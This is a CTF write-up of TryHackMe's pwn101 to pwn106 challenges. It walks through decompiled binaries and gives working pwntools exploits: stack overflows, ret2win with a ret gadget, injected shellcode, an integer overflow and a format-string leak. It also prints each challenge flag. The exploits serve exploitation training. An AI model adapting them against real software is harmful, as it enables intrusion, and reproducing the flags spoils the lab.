---
title: "[THM] Pwn101 Writeup"
cover: >-
    https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/TryHackMe.jpg
categories:
    - [TryHackMe]
    - [CTF]
tags:
    - Pwn
    - Hacking
    - CTF
abbrlink: 83b7f1b
date: 2024-07-20 13:53:43
---

# Challenge 1 - pwn101

First, we use IDA to decompile the binary it gave us. We can see that the program declare a 60 bytes array for char v4. And the winnning condition is to use v4 to overflow and cover the value of v5, which is 1337 initially. Since it didn't ask us to make v5 to a specific value, we can just make sure it not equal to 1337.

![IDA Decompiled Code](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240720141210657.png)

To do that, I use a Python script to do it.

```python
from pwn import *

r = remote("10.10.153.228", 9001)

r.recvuntil("Type the required ingredients to make briyani:")
r.sendline("A"*61)
r.interactive()
```

![Flag](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240720141712693.png)

```txt
THM{7h4t's_4n_3zy_oveRflowwwww}
```

# Challenge 2 - pwn102

First step, IDA decompile the binary.

![IDA Decompiled Code](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240720144645154.png)

According to the code, we can know that the char v4 is a 104 bytes array, and the winning condition is to let v5 equals to `0xC0FF330000C0D3`. So we can simply overflow the v4 to cover v5. The exploit is as follow.

```python
from pwn import *

payload = b"A" * 104 + p64(0xC0FF330000C0D3)


r = remote("10.10.153.228", 9002)
r.recvuntil("Am I right?")
r.sendline(payload)
```

By running this script, we can get the shell to cat the flag out.

![Flag](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240720144940194.png)

```txt
THM{y3s_1_n33D_C0ff33_to_C0d3_<3}
```

# Challenge 3 - pwn103

First, I use `checksec` to check the binary protection.

```bash
┌──(kali㉿kali)-[~/CTF/THM/pwn103]
└─$ pwn checksec pwn
[*] '/home/kali/CTF/THM/pwn103/pwn'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Next, I use IDA to decompile the binary so that I can check where is the vulnerability easier. If you check the decompiled code throughly, you will find out the vuln is in the `general()` function, which is the 3rd choice in the menu (You can also find the vuln if you run the binary and test each choice on the menu). The code of the `general()` function is as follows.

```c
int general()
{
  const char **v0; // rdx
  char s1[32]; // [rsp+0h] [rbp-20h] BYREF

  puts(asc_4023AA);
  puts(aJopraveenHello);
  puts(aJopraveenHopeY);
  puts(aJopraveenYouFo);
  printf("------[pwner]: ");
  __isoc99_scanf("%s", s1);
  if ( strcmp(s1, "yes") )
    return puts(aTryHarder);
  puts(aJopraveenGg);
  return main((int)aJopraveenGg, (const char **)"yes", v0);
}
```

We can notice that the vuln is at the `scanf()`, which allows us to cover the value of `s1`. Furthermore, I found a suspicious function in gdb.

![GDB](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240725152515328.png)

The `admins_only()` function looks interesting. After checking the decompiled code in IDA, I found that it turns out to be dangerous.

```c
int admins_only()
{
  puts(asc_403267);
  puts(aWelcomeAdmin);
  return system("/bin/sh");
}
```

It open the shell for us! The thing is, how can we access this function? Until now, we can probably know that this is a ret2win problem. We need to cover the return address to gain access to the dangerous function. So I use `cyclic 100` to create the pattern to know the offset of the padding.

![Find the offset by cyclic](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240725153412668.png)

Then by using the `cyclic -l faaaaaaa` to look up the offset value, we get the offset is 40.

```bash
pwndbg> cyclic -l faaaaaaa
Finding cyclic pattern of 8 bytes: b'faaaaaaa' (hex: 0x6661616161616161)
Found at offset 40
```

Next step is to find the address of `admins_only()`. Since the binary has no PIE, the address will be always fixed. To get the address, we can simply type in `print &admins_only` in gdb.

```bash
pwndbg> print &admins_only
$1 = (<text variable, no debug info> *) 0x401554 <admins_only>
```

Now, we know that the address of `admins_only()` is `0x401554`, so we can start writing the exploit!

```python
from pwn import *

offset = 40
admin_only_address = 0x401554
padding = b"A" * offset

payload = padding + p64(admin_only_address)

p = remote("10.10.194.195", 9003)
p.sendline(b"3")
p.sendline(payload)
p.interactive()
```

But when we execute the script, it won't give us the shell. After watching this video, I understand that there's a MOVAPS issue.

<div style="position: relative; width: 100%; height: 0; padding-bottom: 56.25%;">
    <iframe style="position: absolute; top: 0; left: 0; width: 100%; height: 100%;" src="https://www.youtube.com/embed/-VUtXwDm5yQ" frameborder="0" allowfullscreen></iframe>
</div>
<br/>

So how do we solve the MOVAPS issue? [This articel](https://ropemporium.com/guide.html) tells us the answer.

> **The MOVAPS issue**
> If you're segfaulting on a `movaps` instruction in `buffered_vfprintf()` or `do_system()` in the x86_64 challenges, then ensure the stack is 16-byte aligned before returning to GLIBC functions such as `printf()` or `system()`. Some versions of GLIBC uses `movaps` instructions to move data onto the stack in certain functions. The 64 bit calling convention requires the stack to be 16-byte aligned before a `call` instruction but this is easily violated during ROP chain execution, causing all further calls from that function to be made with a misaligned stack. `movaps` triggers a general protection fault when operating on unaligned data, so try padding your ROP chain with an extra `ret` before returning into a function or return further into a function to skip a `push` instruction.

Here I use the first method, which is add a ret gadget in my ROP (Return-Oriented Programming) chain. To find the ret gadget, we can type `layout asm` in gdb.

![ret gadget](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240725162429324.png)

Now we can write the exploit with this solution to the MOVAPS issue.

```python
from pwn import *

offset = 40
admin_only_address = 0x401554
padding = b"A" * offset
ret_gadget = 0x4016E0  # Solve the MOVAPS issue

payload = padding + p64(ret_gadget) + p64(admin_only_address)

p = remote("10.10.194.195", 9003)
p.sendline(b"3")
p.sendline(payload)
p.interactive()
```

By running the script, we can get the shell and cat out the flag.txt!

![Pwned!](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240725163326781.png)

```txt
THM{w3lC0m3_4Dm1N}
```

# Challenge 4 - pwn104

Let's start this one by running the program!

```bash
┌──(kali㉿kali)-[~/CTF/THM/pwn104]
└─$ ./pwn104-1644300377109.pwn104 
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 104          

I think I have some super powers 💪
especially executable powers 😎💥

Can we go for a fight? 😏💪
I'm waiting for you at 0x7fff6e63d650
```

If you run the program more than 1 time, you will probably notice that the address given by the program is changing each time. To know why, let's step into the reverse part to see it's decompiled code. The following is the code.

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char buf[80]; // [rsp+0h] [rbp-50h] BYREF

  setup(argc, argv, envp);
  banner();
  puts(aIThinkIHaveSom);
  puts(aEspeciallyExec);
  puts(aCanWeGoForAFig);
  printf("I'm waiting for you at %p\n", buf);
  return read(0, buf, 200uLL);
}
```

In this program, we don't have any vulnerable function to call or return to, so we can obtain the shell only by the shellcode. Look the code above, I notice that there's a vulnerability at the read function. The vulnerability is not caused by the function per se; rather, it's caused by the programmer.

If we check the manual of the `read()` function in C, we can see that this function will read up to a count that set by the programmer. So it's designed to be a secure function, not like the `gets()` function.

![read(2) — Linux manual page](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240728225456197.png)

But in this case, the program designer allocated a buffer with a size of 80 bytes and set the `read()` function can read up to 200 bytes. That's where the vuln came from. Since 200 is way larger than 80, we can still input some malicious stuff to pwn this binary. The PoC is as follows (the segmentation fault).

![PoC](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240728232628241.png)

The first step is to find the offset to overwrite the RIP register. Here I still use the cyclic tool to generate an input with the length of 100 bytes by the command `cyclic 100`.

![GDB](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240728231622992.png)

Then we use `cyclic -l laaaaaa` to lookup the offset, which is 88 in my case. After getting the offset, we can start writing the exploit. Here's how it will go.

1. Get the leak address given by the program.
2. Generate the shellcode by shellcraft.
3. Inject the shellcode to the buf.
4. Control the execution flow to retrun to the shellcode.

To generate the correct shellcode, we need to know some information of the remote system, including the architecture and the OS.

```bash
┌──(kali㉿kali)-[~/CTF/THM/pwn104]
└─$ file pwn104-1644300377109.pwn104 
pwn104-1644300377109.pwn104: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=60e0bab59b4e5412a1527ae562f5b8e58928a7cb, for GNU/Linux 3.2.0, not stripped
```

So in this case, we need to set the architecture to AMD64 and the OS to linux. Here's the exploit.

```python
from pwn import *

r = remote("10.10.107.8", 9004)
r.recvuntil(b"I'm waiting for you at ")

offset = 88
leak_addr = r.recvline().decode()
leak_addr = int(leak_addr, 16)
print(f"Leak address: {hex(leak_addr)}")

# Set the architecture and os for the shellcode crafting
context.arch = "amd64"
context.os = "linux"
shellcode = asm(shellcraft.sh())

padding = b"A" * (offset - len(shellcode))

payload = shellcode + padding + p64(leak_addr)

r.sendline(payload)
r.interactive()
```

By running this, you can get a shell and free to cat out the flag.txt.

```txt
THM{0h_n0o0o0o_h0w_Y0u_Won??}
```

# Challenge 5 - pwn105

Let's decompile the code to see it's behavior. The following is the code decompiled by IDA.

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  unsigned int num1; // [rsp+Ch] [rbp-14h] BYREF
  unsigned int num2; // [rsp+10h] [rbp-10h] BYREF
  unsigned int sum; // [rsp+14h] [rbp-Ch]
  unsigned __int64 v8; // [rsp+18h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  setup(argc, argv, envp);
  banner();
  puts("-------=[ BAD INTEGERS ]=-------");
  puts("|-< Enter two numbers to add >-|\n");
  printf("]>> ");
  __isoc99_scanf("%d", &num1);
  printf("]>> ");
  __isoc99_scanf("%d", &num2);
  sum = num1 + num2;
  if ( (num1 & 0x80000000) != 0 || (num2 & 0x80000000) != 0 )
  {
    printf("\n[o.O] Hmmm... that was a Good try!\n");
  }
  else if ( (sum & 0x80000000) != 0 )
  {
    printf("\n[*] C: %d", sum);
    puts("\n[*] Popped Shell\n[*] Switching to interactive mode");
    system("/bin/sh");
  }
  else
  {
    printf("\n[*] ADDING %d + %d", num1, num2);
    printf("\n[*] RESULT: %d\n", sum);
  }
  return v8 - __readfsqword(0x28u);
}
```

According to the code, we can know the following things.

1. This program takes two int as the input & stored them as `unsigned int`.
2. If the MSB (sign bit) of `num1` or `num2` is not equal to 0, which means one of the num is less than 0, the program will output "\n[o.O] Hmmm... that was a Good try!\n" and exit the program.
3. Else if the MSB of the sum is less than 0, the program will return a shell, which is the winning condition.
4. Else the program will outuput the sum and exit.

Since we can't input any negative number or it will exit, we need another way to make the sum negative. We know that the maximum of an `unsigned int` is $2^{31}-1$ and the MSB represents a sign, so we can input the maximum of the unsigned int as one of the num and input another int less than $2^{31}-1$ to make the `sum` overflow, then it will be a negative int! The following is the exploit.

```python
from pwn import *

r = remote("10.10.107.8", 9005)

r.sendline(b"2147483647")
r.sendline(b"1")
r.interactive()
```

Here, I send 2147483647 and 1 to make the sum overflow to be -2147483648. That way, we can get the shell.

![Pwned](https://raw.githubusercontent.com/CX330Blake/MyBlogPhotos/main/image/image-20240727180209127.png)

```txt
THM{VerY_b4D_1n73G3rsss}
```

# Challenge 6 - pwn106

First, let's see the protection of this binary.

```bash
┌──(kali㉿kali)-[~/CTF/THM/pwn106]
└─$ pwn checksec pwn106                      
[*] '/home/kali/CTF/THM/pwn106/pwn106'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

Almost everything is on.  Next step, we test some input to the binary to see what vulnerability it has.

```bash
┌──(kali㉿kali)-[~/CTF/THM/pwn106]
└─$ ./pwn106
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 107          

🎉 THM Giveaway 🎉

Enter your THM username to participate in the giveaway: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Thanks AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

Doesn't look like a BOF.

```bash
┌──(kali㉿kali)-[~/CTF/THM/pwn106]
└─$ ./pwn106
       ┌┬┐┬─┐┬ ┬┬ ┬┌─┐┌─┐┬┌─┌┬┐┌─┐
        │ ├┬┘└┬┘├─┤├─┤│  ├┴┐│││├┤ 
        ┴ ┴└─ ┴ ┴ ┴┴ ┴└─┘┴ ┴┴ ┴└─┘
                 pwn 107          

🎉 THM Giveaway 🎉

Enter your THM username to participate in the giveaway: %p %p %p %p %p %p 

Thanks 0x7ffd43b908a0 (nil) (nil) 0x55e71b068380 0x7f3191483b30 0x5b5858587b4d4854 
```

It seems to be a format string vulnerability PoC! ([See here for more info](https://ctf101.org/binary-exploitation/what-is-a-format-string-vulnerability/))

In order to understand the vulnerability more clearly, we step into the code that is decompiled by IDA.

```c
int __fastcall main(int argc, const char **argv, const char **envp)
{
  char buf[56]; // [rsp+20h] [rbp-40h] BYREF
  unsigned __int64 v6; // [rsp+58h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  setup(argc, argv, envp);
  banner();
  puts(&byte_2119);
  printf("Enter your THM username to participate in the giveaway: ");
  read(0, buf, 0x32uLL);
  printf("\nThanks ");
  printf(buf);
  return v6 - __readfsqword(0x28u);
}
```

Here, the programmer read 0x32 bytes, which is 50 in decimal, and stored it in a buf of 56 bytes. So apparently the BOF doesn't exist. But this line gives a format string vulnerability for us to leak out the flag on the stack.

```c
printf(buf);
```

The following is the format specifier table I found on [GeeksforGeeks](https://www.geeksforgeeks.org/format-specifiers-in-c/).

|    Format Specifier    |                Description                 |
| :--------------------: | :----------------------------------------: |
|      ***\*%c\****      |            For character type.             |
|      ***\*%d\****      |          For signed integer type.          |
|   ***\*%e or %E\****   |     For scientific notation of floats.     |
|      ***\*%f\****      |              For float type.               |
|   ***\*%g or %G\****   | For float type with the current precision. |
|      ***\*%i\****      |               signed integer               |
|  ***\*%ld or %li\****  |                    Long                    |
|     ***\*%lf\****      |                   Double                   |
|     ***\*%Lf\****      |                Long double                 |
|     ***\*%lu\****      |       Unsigned int or unsigned long        |
| ***\*%lli or %lld\**** |                 Long long                  |
|     ***\*%llu\****     |             Unsigned long long             |
|      ***\*%o\****      |            Octal representation            |
|      ***\*%p\****      |                  Pointer                   |
|      ***\*%s\****      |                   String                   |
|      ***\*%u\****      |                Unsigned int                |
|   ***\*%x or %X\****   |         Hexadecimal representation         |
|      ***\*%n\****      |               Prints nothing               |
|      ***\*%%\****      |             Prints % character             |

And here I used the `%p` to leak the stack out. The following is the exploit.

```python
from pwn import *
from Crypto.Util.number import long_to_bytes

r = remote("10.10.87.15", 9006)
r.recvuntil("giveaway: ")
r.sendline(b"%p " * 20)  # This is the payload
r.recvuntil("Thanks ")

leak_items = r.recvall().split()  # Cause we sent the payload seperated by spaces

valid_items = []
for item in leak_items:
    try:
        item = int(item.decode(), 16)  # Change it to decimal to convert it to bytes
        valid_items.append(
            long_to_bytes(item)[::-1].decode()
        )  # Due to the little-endianess
    except ValueError:
        pass

flag = "".join(valid_items)
print(flag)
```

```txt
THM{y0U_w0n_th3_Giv3AwaY_anD_th1s_1s_YouR_fl4G}
```

